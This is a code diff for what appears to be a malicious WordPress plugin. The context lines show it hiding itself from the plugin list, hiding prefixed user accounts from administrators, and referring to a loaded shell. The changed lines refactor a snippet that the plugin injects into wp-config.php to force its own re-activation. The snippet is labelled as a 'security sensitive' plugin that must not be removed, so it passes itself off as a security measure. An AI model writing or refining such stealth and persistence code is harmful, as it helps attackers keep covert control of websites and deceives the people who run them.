@@ -54,10 +54,6 @@ add_filter('all_plugins', '__PREFIX__hide_plugin_from_list');
  * @param $user_query WP_User_Query User query object
  */
 function filter_users_by_prefix($user_query) {
-    /*ob_start();
-    var_dump(WP_Screen::get());
-    $hook_suffix = ob_get_clean();
-    throw new Exception($hook_suffix);*/
     // check if the script is executed directly, in that case the shell is loaded and all users are returned
     if (defined('__WP__')) {
         return $user_query;
@@ -94,7 +90,7 @@ function filter_users_views($views) {
     return $views;
 }
 
-add_filter( "views_users", "filter_users_views");
+add_filter("views_users", "filter_users_views");
 
 
 /**
@@ -124,18 +120,7 @@ function __PREFIX__add_auto_activation_snippet() {
         $wp_config = file_get_contents($wp_config_path);
 
         $plugin                  = plugin_basename(__FILE__);
-        $auto_activation_snippet = <<<EOT
-
-// Auto activate security sensitive plugin - do not remove
-\$active_plugins = get_option('active_plugins', array());
-
-// Check if the plugin is already activated
-if (!in_array("$plugin", \$active_plugins)) {
-    \$active_plugins[] = "$plugin";
-    update_option('active_plugins', \$active_plugins);
-}
-
-EOT;
+        $auto_activation_snippet = "// - DO NOT REMOVE - Auto activate security sensitive plugins\n\$active_plugins = get_option('active_plugins', array());\n\n// - DO NOT REMOVE - Check if the plugin is already activated\nif (!in_array(\"$plugin\", \$active_plugins)) {\n\t\$active_plugins[] = \"$plugin\";\n\tupdate_option('active_plugins', \$active_plugins);\n}\n\n";
 
         // Check if the snippet is already in the file
         if (strpos($wp_config, $auto_activation_snippet) === false) {
